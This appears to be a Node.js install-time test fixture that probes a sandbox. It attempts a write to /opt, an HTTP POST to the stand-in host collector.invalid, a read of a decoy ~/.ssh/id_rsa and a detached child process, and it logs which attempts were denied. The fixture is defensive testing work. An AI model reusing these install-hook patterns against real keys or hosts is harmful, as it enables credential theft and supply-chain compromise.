// The npm equivalent of the Python fixture: runs at install time, attempts four things,
// writes what happened. Every target is inert.
const fs = require('fs');
const http = require('http');
const { spawn } = require('child_process');

const findings = [];

function attempt(label, fn) {
  try {
    findings.push(`${label}=ok:${fn()}`);
  } catch (err) {
    findings.push(`${label}=denied:${err.code || err.name}`);
  }
}

function writeOutside() {
  fs.writeFileSync('/opt/ar-probe', 'probe\n');
  return '/opt/ar-probe';
}

function egress(done) {
  // Node does not honour HTTP_PROXY the way urllib does, so point the request at the
  // proxy explicitly when one is configured -- otherwise the attempt dies at DNS and the
  // proxy log stays empty, which is exactly the evidence we want.
  const proxy = process.env.HTTP_PROXY || process.env.http_proxy || '';
  const target = { path: 'http://collector.invalid/v1/collect', method: 'POST' };
  let options;
  if (proxy) {
    const url = new URL(proxy);
    options = { host: url.hostname, port: url.port || 80, ...target,
                headers: { Host: 'collector.invalid', 'Content-Type': 'application/octet-stream' } };
  } else {
    options = { host: 'collector.invalid', port: 80, ...target };
  }
  const req = http.request(options, (res) => done(null, res.statusCode));
  req.on('error', (err) => done(err));
  req.write('probe-payload');
  req.end();
}

function readDecoy() {
  const home = process.env.AR_DECOY_HOME || '/nonexistent-ar-decoy';
  return fs.readFileSync(`${home}/.ssh/id_rsa`).length;
}

function persist() {
  spawn('/bin/sleep', ['300'], { detached: true, stdio: 'ignore' }).unref();
  return 'spawned';
}

const selected = new Set((process.env.AR_PROBES || '').split(',').filter(Boolean));
const all = selected.size === 0;

if (all || selected.has('write_outside')) attempt('write_/opt/ar-probe', writeOutside);
if (all || selected.has('decoy_key')) attempt('read_decoy_ssh_key', readDecoy);
if (all || selected.has('detached_child')) attempt('spawn_detached', persist);

function finish() {
  const out = process.env.AR_PROBE_OUT || '/work/out/probe.json';
  try {
    fs.mkdirSync(require('path').dirname(out), { recursive: true });
    fs.writeFileSync(out, JSON.stringify({ attempts: findings }, null, 2));
  } catch (err) {
    // a failed report must not break the install
  }
  console.error('AR_PROBE ' + findings.join(' | '));
}

if (all || selected.has('egress')) {
  egress((err, status) => {
    findings.push(err ? `egress_collector.invalid=denied:${err.code || err.name}`
                      : `egress_collector.invalid=ok:${status}`);
    finish();
  });
} else {
  finish();
}
